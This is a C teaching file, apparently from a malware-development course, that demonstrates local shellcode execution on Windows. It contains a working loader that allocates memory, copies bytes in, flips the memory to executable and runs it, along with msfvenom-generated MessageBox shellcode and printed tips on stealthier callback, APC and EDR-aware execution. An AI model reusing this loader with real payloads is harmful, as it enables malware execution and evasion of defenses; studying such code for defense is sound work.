/*
 * Lesson 04: Local Shellcode Execution
 *
 * Putting it all together: allocate memory, copy shellcode, execute.
 * This is the foundation of ALL shellcode execution techniques.
 *
 * CRITICAL for maldev:
 * - Execute position-independent code (PIC)
 * - Run payloads without touching disk
 * - Foundation for process injection
 *
 * Pattern:
 * 1. VirtualAlloc(RW) - Allocate writable memory
 * 2. memcpy() - Copy shellcode to buffer
 * 3. VirtualProtect(RX) - Make executable
 * 4. CreateThread() or direct call - Execute shellcode
 */

#include <windows.h>
#include <stdio.h>

// Simple MessageBox shellcode (x64)
// msfvenom -p windows/x64/messagebox TEXT="Shellcode Executed!" TITLE="Maldev" -f c
unsigned char msgboxShellcode[] =
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
    "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
    "\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
    "\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
    "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
    "\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
    "\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
    "\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
    "\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
    "\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
    "\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
    "\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
    "\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
    "\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d"
    "\x85\x2b\x01\x00\x00\x48\x31\xc9\x41\xba\xec\x0e\x4e\x0e\xff"
    "\xd5\x48\x31\xc9\x41\xba\x75\x6e\x4d\x61\xff\xd5\x48\x83\xc4"
    "\x60\x5d\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfa\x00"
    "\x00\x00\x3e\x4c\x8d\x85\x09\x01\x00\x00\x48\x31\xc9\x41\xba"
    "\x6c\x6c\x11\x5f\xff\xd5\x48\x83\xec\x10\x48\x89\xe2\x4d\x31"
    "\xc9\x48\x89\xe1\x48\x31\xc0\x48\xff\xc0\x48\x89\x42\x08\x48"
    "\xff\xc0\x48\x89\x42\x10\x48\xff\xc0\x48\x89\x02\x48\x83\xec"
    "\x20\x41\xba\xff\xff\xff\xff\xff\xd5\x48\x83\xc4\x20\x5d\x6a"
    "\x00\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xe5\x00\x00"
    "\x00\x3e\x4c\x8d\x85\xf1\x00\x00\x00\x48\x31\xc9\x41\xba\x2d"
    "\x06\x18\x7b\xff\xd5\x48\x83\xc4\x40\x5d\x6a\x00\x49\xc7\xc1"
    "\x00\x00\x00\x00\x3e\x48\x8d\x95\xcd\x00\x00\x00\x3e\x4c\x8d"
    "\x85\xdd\x00\x00\x00\x48\x31\xc9\x41\xba\xe5\x24\x11\xdc\xff"
    "\xd5\x48\x83\xc4\x40\x5d\xe9\xa0\xff\xff\xff\x4d\x61\x6c\x64"
    "\x65\x76\x00\x53\x68\x65\x6c\x6c\x63\x6f\x64\x65\x20\x45\x78"
    "\x65\x63\x75\x74\x65\x64\x21\x00";

// Simple NOP sled + RET (safe shellcode for testing)
unsigned char safeShellcode[] = {
    0x90, 0x90, 0x90, 0x90,  // NOP
    0x90, 0x90, 0x90, 0x90,  // NOP
    0xC3                      // RET
};

void DemoDirectExecution() {
    printf("[*] Demo 1: Direct Shellcode Execution (Function Pointer)\n");

    SIZE_T shellcodeSize = sizeof(safeShellcode);
    DWORD oldProtect;

    printf("[+] Shellcode size: %zu bytes\n", shellcodeSize);

    // Step 1: Allocate RW memory
    printf("\n[1] Allocating RW memory...\n");
    LPVOID pShellcode = VirtualAlloc(
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!pShellcode) {
        printf("[-] VirtualAlloc failed: %lu\n", GetLastError());
        return;
    }
    printf("[+] Allocated at 0x%p\n", pShellcode);

    // Step 2: Copy shellcode
    printf("\n[2] Copying shellcode...\n");
    memcpy(pShellcode, safeShellcode, shellcodeSize);
    printf("[+] Copied %zu bytes\n", shellcodeSize);

    // Step 3: Change to RX
    printf("\n[3] Changing protection to RX...\n");
    if (!VirtualProtect(pShellcode, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[-] VirtualProtect failed: %lu\n", GetLastError());
        VirtualFree(pShellcode, 0, MEM_RELEASE);
        return;
    }
    printf("[+] Memory is now executable\n");

    // Step 4: Execute via function pointer
    printf("\n[4] Executing shellcode...\n");
    void (*shellcodeFunc)() = (void(*)())pShellcode;
    shellcodeFunc();

    printf("[+] Shellcode executed successfully!\n");

    VirtualFree(pShellcode, 0, MEM_RELEASE);
    printf("\n");
}

void DemoThreadExecution() {
    printf("[*] Demo 2: Shellcode Execution via CreateThread\n");

    SIZE_T shellcodeSize = sizeof(safeShellcode);
    DWORD oldProtect;

    // Allocate and prepare shellcode
    LPVOID pShellcode = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pShellcode) {
        printf("[-] VirtualAlloc failed\n");
        return;
    }

    memcpy(pShellcode, safeShellcode, shellcodeSize);
    VirtualProtect(pShellcode, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);

    printf("[+] Shellcode ready at 0x%p\n", pShellcode);

    // Create thread to execute shellcode
    printf("[+] Creating thread to execute shellcode...\n");
    HANDLE hThread = CreateThread(
        NULL,                           // Security attributes
        0,                              // Stack size
        (LPTHREAD_START_ROUTINE)pShellcode,  // Start address
        NULL,                           // Parameter
        0,                              // Creation flags
        NULL                            // Thread ID
    );

    if (!hThread) {
        printf("[-] CreateThread failed: %lu\n", GetLastError());
        VirtualFree(pShellcode, 0, MEM_RELEASE);
        return;
    }

    printf("[+] Thread created (handle: 0x%p)\n", hThread);

    // Wait for thread to complete
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] Thread completed\n");

    CloseHandle(hThread);
    VirtualFree(pShellcode, 0, MEM_RELEASE);
    printf("\n");
}

void DemoMessageBoxShellcode() {
    printf("[*] Demo 3: MessageBox Shellcode (Real Payload)\n");
    printf("[!] This will pop a MessageBox - close it to continue\n\n");

    SIZE_T shellcodeSize = sizeof(msgboxShellcode);
    DWORD oldProtect;

    // Allocate memory
    printf("[1] Allocating memory for shellcode...\n");
    LPVOID pShellcode = VirtualAlloc(
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!pShellcode) {
        printf("[-] Allocation failed: %lu\n", GetLastError());
        return;
    }
    printf("[+] Allocated %zu bytes at 0x%p\n", shellcodeSize, pShellcode);

    // Copy shellcode
    printf("\n[2] Copying MessageBox shellcode...\n");
    memcpy(pShellcode, msgboxShellcode, shellcodeSize);
    printf("[+] Shellcode copied\n");

    // Make executable
    printf("\n[3] Making memory executable...\n");
    if (!VirtualProtect(pShellcode, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[-] VirtualProtect failed: %lu\n", GetLastError());
        VirtualFree(pShellcode, 0, MEM_RELEASE);
        return;
    }
    printf("[+] Protection: RW -> RX\n");

    // Execute in new thread
    printf("\n[4] Executing MessageBox shellcode...\n");
    HANDLE hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pShellcode,
        NULL,
        0,
        NULL
    );

    if (!hThread) {
        printf("[-] CreateThread failed: %lu\n", GetLastError());
        VirtualFree(pShellcode, 0, MEM_RELEASE);
        return;
    }

    printf("[+] Thread created, waiting for completion...\n");
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] MessageBox closed\n");

    CloseHandle(hThread);
    VirtualFree(pShellcode, 0, MEM_RELEASE);
    printf("\n");
}

void DemoCallbackExecution() {
    printf("[*] Demo 4: Shellcode via Callback (EnumWindows)\n");

    SIZE_T shellcodeSize = sizeof(safeShellcode);
    DWORD oldProtect;

    // Prepare shellcode
    LPVOID pShellcode = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pShellcode) {
        printf("[-] Allocation failed\n");
        return;
    }

    memcpy(pShellcode, safeShellcode, shellcodeSize);
    VirtualProtect(pShellcode, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);

    printf("[+] Shellcode at 0x%p\n", pShellcode);

    // Execute via callback
    printf("[+] Executing via EnumWindows callback...\n");
    printf("[!] EnumWindows expects callback to return TRUE/FALSE\n");
    printf("[!] Our RET shellcode will return, potentially causing issues\n");
    printf("[!] Real shellcode would handle this properly\n\n");

    // Cast to callback type and execute
    // EnumWindows((WNDENUMPROC)pShellcode, 0);  // Commented for safety

    printf("[*] Other callback execution vectors:\n");
    printf("    - EnumWindows\n");
    printf("    - EnumSystemLocalesA\n");
    printf("    - EnumThreadWindows\n");
    printf("    - EnumChildWindows\n");
    printf("    - SetTimer (timer callback)\n");
    printf("    - APC (QueueUserAPC)\n");

    VirtualFree(pShellcode, 0, MEM_RELEASE);
    printf("\n");
}

void DemoShellcodeAnalysis() {
    printf("[*] Demo 5: Shellcode Analysis & Verification\n");

    printf("[+] Safe Shellcode:\n");
    printf("    Bytes: ");
    for (SIZE_T i = 0; i < sizeof(safeShellcode); i++) {
        printf("%02X ", safeShellcode[i]);
    }
    printf("\n");
    printf("    Disassembly:\n");
    printf("      0x90 = NOP (No Operation)\n");
    printf("      0xC3 = RET (Return)\n\n");

    printf("[+] MessageBox Shellcode:\n");
    printf("    Size: %zu bytes\n", sizeof(msgboxShellcode));
    printf("    Type: Position-Independent Code (PIC)\n");
    printf("    Payload: MessageBox with custom text\n");
    printf("    Generator: msfvenom (Metasploit Framework)\n\n");

    printf("[!] Shellcode Characteristics:\n");
    printf("    1. Position-Independent: Works at any address\n");
    printf("    2. Self-contained: No external dependencies\n");
    printf("    3. Null-free: Avoids 0x00 bytes (for some exploits)\n");
    printf("    4. Small size: Optimized for injection\n");
    printf("    5. Encoded: Can be XOR/RC4 encrypted\n\n");
}

void DemoExecutionPatterns() {
    printf("[*] Demo 6: Common Execution Patterns\n");

    printf("[+] Pattern 1: Direct Call (Function Pointer)\n");
    printf("    void (*func)() = (void(*)())pShellcode;\n");
    printf("    func();\n");
    printf("    Pro: Simple, fast\n");
    printf("    Con: Runs in current thread\n\n");

    printf("[+] Pattern 2: CreateThread\n");
    printf("    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pShellcode, NULL, 0, NULL);\n");
    printf("    Pro: Dedicated thread, easy to manage\n");
    printf("    Con: Suspicious API call\n\n");

    printf("[+] Pattern 3: Callbacks\n");
    printf("    EnumWindows((WNDENUMPROC)pShellcode, 0);\n");
    printf("    Pro: Stealthier, legitimate API\n");
    printf("    Con: Must match callback signature\n\n");

    printf("[+] Pattern 4: Fiber (Advanced)\n");
    printf("    CreateFiber(0, (LPFIBER_START_ROUTINE)pShellcode, NULL);\n");
    printf("    Pro: Cooperative multitasking\n");
    printf("    Con: More complex\n\n");

    printf("[+] Pattern 5: APC (Async Procedure Call)\n");
    printf("    QueueUserAPC((PAPCFUNC)pShellcode, hThread, 0);\n");
    printf("    Pro: Asynchronous, stealthy\n");
    printf("    Con: Requires alertable thread\n\n");
}

int main() {
    printf("==============================================\n");
    printf("  Local Shellcode Execution - Complete Guide\n");
    printf("==============================================\n\n");

    DemoDirectExecution();
    DemoThreadExecution();

    // Ask before showing MessageBox
    printf("[?] Run MessageBox shellcode demo? (y/n): ");
    char choice;
    scanf(" %c", &choice);
    if (choice == 'y' || choice == 'Y') {
        DemoMessageBoxShellcode();
    }

    DemoCallbackExecution();
    DemoShellcodeAnalysis();
    DemoExecutionPatterns();

    printf("[*] Key Takeaways:\n");
    printf("    1. Shellcode execution: Allocate -> Copy -> Protect -> Execute\n");
    printf("    2. Use RW->RX pattern (not direct RWX)\n");
    printf("    3. Multiple execution vectors (thread, callback, APC, etc.)\n");
    printf("    4. Shellcode must be position-independent\n");
    printf("    5. This is foundation for process injection\n");
    printf("    6. EDR detects RWX memory and suspicious APIs\n\n");

    printf("[!] Next Steps:\n");
    printf("    - Week 7: DLL Injection\n");
    printf("    - Week 8: Remote Process Injection\n");
    printf("    - Shellcode Encoders (XOR, RC4)\n");
    printf("    - Syscalls for stealth\n\n");

    return 0;
}
